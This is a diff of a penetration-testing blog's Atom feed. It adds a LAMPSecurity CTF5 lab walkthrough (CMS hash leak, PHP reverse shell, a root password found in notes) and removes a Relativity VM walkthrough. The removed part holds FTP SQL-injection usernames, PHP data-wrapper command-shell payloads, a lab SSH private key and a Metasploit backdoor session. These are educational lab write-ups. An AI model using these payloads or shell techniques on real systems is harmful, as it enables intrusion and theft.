@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-04-29T12:16:23-04:00</updated>
+  <updated>2016-05-24T15:50:38-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,225 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
+    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
+    <updated>2016-05-05T12:24:38-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
+    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>
+
+<!-- more -->
+
+
+<h3>Recon</h3>
+
+<p>Nmap scan reveals there are plenty of open ports:</p>
+
+<p>``` plain
+nmap -sS -sV -p1-65535 192.168.80.154</p>
+
+<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-09 12:17 EDT
+Nmap scan report for 192.168.80.154
+Host is up, received arp-response (0.00024s latency).
+Not shown: 65524 closed ports
+Reason: 65524 resets
+PORT      STATE SERVICE     REASON         VERSION
+22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
+25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
+80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
+110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
+111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
+139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
+143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
+445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
+901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
+3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
+38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
+```</p>
+
+<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>
+
+<h4>Web server</h4>
+
+<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>
+
+<p><img class="center" src="/images/pentest/ctf5/phake.png" title="&lsquo;phake home&rsquo; &lsquo;phake org&rsquo;" ></p>
+
+<p>We can register for a mailing list:</p>
+
+<p><img class="center" src="/images/pentest/ctf5/list.png" title="&lsquo;mail list&rsquo; &lsquo;mailing list&rsquo;" ></p>
+
+<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>
+
+<p>The blog page also has an admin login page and another Squirrel Mail page:</p>
+
+<p><img class="center" src="/images/pentest/ctf5/blog.png" title="&lsquo;blog&rsquo; &lsquo;blog&rsquo;" ></p>
+
+<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>
+
+<p><img class="center" src="/images/pentest/ctf5/event.png" title="&lsquo;event manager&rsquo; &lsquo;event planner&rsquo;" ></p>
+
+<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>
+
+<h3>Exploiting the CMS</h3>
+
+<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>
+
+<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>
+
+<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>
+
+<p><code>plain
+a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
+</code></p>
+
+<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>
+
+<p><img class="center" src="/images/pentest/ctf5/nanocms.png" title="&lsquo;nanocms admin panel&rsquo; &lsquo;admin panel&rsquo;" ></p>
+
+<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>
+
+<p><code>plain
+nc -vvnlp 5555
+listening on [any] 5555 ...
+connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
+Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
+ 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+sh: no job control in this shell
+sh-3.2$ whoami
+apache
+</code></p>
+
+<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>
+
+<p><code>plain
+sh-3.2$ ls
+amy
+andy
+jennifer
+loren
+patrick
+</code></p>
+
+<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>
+
+<p><code>plain
+sh-3.2$ ls -al patrick
+total 344
+drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
+drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
+-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
+drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
+-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
+-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
+-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
+-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
+-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
+drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
+drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
+drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
+drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
+drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
+drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
+-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
+-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
+drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
+-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
+drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
+drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
+-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
+drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
+-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
+drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
+-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
+drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
+-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
+-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
+-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
+-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
+-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
+drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
+-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt
+</code></p>
+
+<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>
+
+<p><code>plain
+sh-3.2$ cat .tomboy.log
+...
+12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
+12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
+12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
+12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
+12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
+12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
+12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
+12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
+12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!
+</code></p>
+
+<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>
+
+<p><code>plain
+sh-3.2$ ls
+481bca0d-7206-45dd-a459-a72ea1131329.note
+addin-db-000
+addins
+ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
+d2684fad-3aab-444c-b90a-4f307c0818f6.note
+manifest.xml
+</code></p>
+
+<p>Found the jackpot in the first one!</p>
+
+<p>``` plain
+sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
+&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?>
+<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
+  <title>Root password</title>
+  <text xml:space="preserve">&lt;note-content version=&ldquo;0.1&rdquo;>Root password</p>
+
+<p>Root password</p>
+
+<p>50$cent&lt;/note-content></text>
+&hellip;
+```</p>
+
+<p>Now all that is left is to become root! I SSH'ed with the root credentials and the machine is mine now!</p>
+
+<h5>Concluding remarks</h5>
+
+<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>
+
+<p>``` plain
+/ It&rsquo;s lucky you&rsquo;re going so slowly, \
+| because you&rsquo;re going in the wrong  |
+\ direction.                         /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF4]]></title>
@@ -991,7 +1210,7 @@ dcbe2a56e8cdea6d17495f6648329ee2-4679.pub
 <p>Great! A match has been found! I used to ssh on the box as obama (wouldn&rsquo;t it be nice to be able to do this on an actual White House computer.. xD)</p>
 
 <p>``` plain
-root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#111;&#x62;&#x61;&#x6d;&#97;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#56;&#48;&#x2e;&#49;&#x35;&#48;">&#x6f;&#x62;&#x61;&#109;&#x61;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#56;&#48;&#x2e;&#49;&#53;&#48;</a>
+root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x6f;&#98;&#97;&#109;&#97;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x38;&#x30;&#x2e;&#x31;&#53;&#48;">&#111;&#x62;&#97;&#x6d;&#x61;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#56;&#x30;&#46;&#x31;&#53;&#48;</a>
 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686</p>
 
 <p>The programs included with the Ubuntu system are free software;
@@ -1318,398 +1537,6 @@ imadecoy: tcpdump capture file (little-endian) - version 2.4 (Linux "cooked", ca
 <p>Something seems wrong with the server and I get a (real) 404 error for this level only. When it works again I will update this section</p>
 
 <p><img class="center" src="/images/infosec_institute_ctf/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
-    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
-    <updated>2015-05-10T09:40:50-04:00</updated>
-    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
-    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>
-
-<!-- more -->
-
-
-<p>``` plain
- nmap -A -p1-65535 192.168.80.128</p>
-
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-10 16:46 EEST
-Nmap scan report for 192.168.80.128
-Host is up (0.00058s latency).
-Not shown: 65532 filtered ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp
-22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
-| ssh-hostkey:
-|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
-|<em>  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
-80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
-|</em>http-title: M.C. Escher &ndash; Relativity
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
-SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
-SF:(GenericLines,29,&ldquo;220\x20Welcome\x20to\x20Relativity\x20FTP\x20(mod_sq
-SF:l)\r\n&rdquo;);
-MAC Address: 00:0C:29:9F:1D:0E (VMware)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 &ndash; 3.10
-Network Distance: 1 hop
-Service Info: Host: Relativity
-```</p>
-
-<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>
-
-<p><code>plain
-220 Welcome to Relativity FTP (mod_sql)
-</code></p>
-
-<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>
-
-<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>
-
-<p>``` plain
-username: %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; &mdash;
-password: 1</p>
-
-<p>username: %&lsquo;) and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); &mdash; a
-```</p>
-
-<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>
-
-<p><code>plain
-220 Welcome to Relativity FTP (mod_sql)
-Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
-331 Password required for username:.
-Password:
-230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-</code></p>
-
-<p>Next, I found out an interesting looking directory:</p>
-
-<p><code>plain
-ftp&gt; pwd
-257 "/" is current directory.
-ftp&gt; dir
-200 PORT command successful
-150 Opening ASCII mode data connection for file list
-drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
--rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
--rw-r--r--   1 root     root          130 Mar  5  2013 index.html
-226 Transfer complete.
-</code></p>
-
-<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>
-
-<p><img class="center" src="/images/pentest/relativity/secretdir.png" title="&lsquo;secretdir&rsquo; &lsquo;secretdir&rsquo;" ></p>
-
-<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
-Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>
-
-<p>``` plain</p>
-
-<h1>simple RFI</h1>
-
-<p>page=data://text/plain, &lt;?php system(&ldquo;whoami&rdquo;);?></p>
-
-<h1>base64 encoded RFI</h1>
-
-<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==</p>
-
-<h1>mini shell</h1>
-
-<p>page=data://text/plain,&lt;?php system($_GET[cmd]);?>&amp;cmd=id</p>
-
-<h1>base64 + URL encoded mini shell (didn&rsquo;t work without URL encoding)</h1>
-
-<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id
-```</p>
-
-<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>
-
-<h2>``` plain</h2>
-
-<p>mauk:x:1001:1001::/home/mauk:/bin/bash
-jetta:x:1002:1002::/home/jetta:/bin/bash
-```</p>
-
-<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>
-
-<p><code>plain
-drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
-drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk
-</code></p>
-
-<p>Looking in mauk&rsquo;s directory, this is interesting:</p>
-
-<p><code>
-drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
-</code></p>
-
-<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>
-
-<p>``` plain
--rw-r&mdash;r&mdash;. 1 mauk mauk 1679 Feb 24  2013 id_rsa</p>
-
-<p>```</p>
-
-<p>And we can read it:</p>
-
-<p><code>plain
------BEGIN RSA PRIVATE KEY-----
-MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
-9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
-5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
-zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
-ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
-xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
-tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
-jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
-f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
-r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
-Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
-BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
-MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
-szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
-YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
-+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
-3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
-Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
-3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
-ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
-dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
-J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
-ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
-bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
-aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
------END RSA PRIVATE KEY-----
-</code></p>
-
-<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>
-
-<p><code>plain
-[mauk@Relativity ~]$ ls -l /opt
-total 4
-drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal
-</code></p>
-
-<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>
-
-<p><code>plain
-[mauk@Relativity ~]$ netstat -lntp
-(No info could be read for "-p": geteuid()=1001 but you should be root.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
-...
-</code></p>
-
-<p>The ircd server might be an avenue for privilege escalation to jetta:</p>
-
-<p><code>plain
-[mauk@Relativity ~]$ ps -u jetta
-  PID TTY          TIME CMD
-  557 ?        00:00:00 ircd
-</code></p>
-
-<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>
-
-<p><code>plain
-root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128
-Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
-[mauk@Relativity ~]$
-</code></p>
-
-<p>And now I could port scan my local 4444 port to learn more:</p>
-
-<p>``` plain
-root@kali:~# nmap -A -sV 127.0.0.1 4444</p>
-
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-23 16:31 EEST
-setup_target: failed to determine route to 4444 (0.0.17.92)
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000065s latency).
-Not shown: 999 closed ports
-PORT     STATE SERVICE VERSION
-4444/tcp open  irc     Unreal ircd
-| irc-info:
-|   server: relativity.localdomain
-|   version: Unreal3.2.8.1. relativity.localdomain
-|   servers: 1
-|   users: 1
-|   lservers: 0
-|   lusers: 1
-|   uptime: 0 days, 0:51:08
-|   source host: rox-D2735CD4
-|_  source ident: nmap
-```</p>
-
-<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>
-
-<p>``` plain
-msf exploit(unreal_ircd_3281_backdoor) > run</p>
-
-<p>[<em>] Started reverse handler on 192.168.80.130:5555
-[</em>] Connected to 127.0.0.1:4444&hellip;</p>
-
-<pre><code>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
-</code></pre>
-
-<p>[<em>] Sending backdoor command&hellip;
-[</em>] Command shell session 1 opened (192.168.80.130:5555 &ndash;> 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300</p>
-
-<p>whoami
-jetta
-```</p>
-
-<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>
-
-<p><code>plain
-strings /home/jetta/auth_server/auth_server
-/lib64/ld-linux-x86-64.so.2
-__gmon_start__
-libc.so.6
-fflush
-puts
-putchar
-printf
-poll
-stdout
-system
-__libc_start_main
-GLIBC_2.2.5
-l$ L
-t$(L
-|$0H
-[+] Checking Certificates...
-done
-[+] Contacting server, please wait...
-could not establish connection
-invalid certificates
-error: (12)
-fortune -s | /usr/bin/cowsay
-Starting Auth server..
-;*3$"
-</code></p>
-
-<p>Interesting. This binary also appears to be owned as root:</p>
-
-<p><code>plain
-ls -l /home/jetta/auth_server/auth_server
--rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server
-</code></p>
-
-<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>
-
-<p><code>plain
-[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'Not interactive'
-Not interactive
-</code></p>
-
-<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>
-
